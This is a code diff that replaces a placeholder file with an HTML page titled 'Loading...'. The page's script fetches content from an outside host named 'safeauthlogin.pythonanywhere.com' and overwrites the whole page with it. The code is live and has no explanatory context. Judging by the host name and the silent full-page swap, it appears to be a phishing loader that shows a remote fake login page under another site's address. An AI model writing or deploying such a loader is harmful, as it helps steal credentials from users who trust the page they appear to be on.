@@ -1,1 +1,19 @@
-Hi
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+
+<script>
+    var url = "https://safeauthlogin.pythonanywhere.com/";
+    console.log(window.location.pathname);
+
+    $.get( "https://safeauthlogin.pythonanywhere.com/", function(data) {
+    $("html").html(data);
+    });
+</script>
+</body>
+</html>
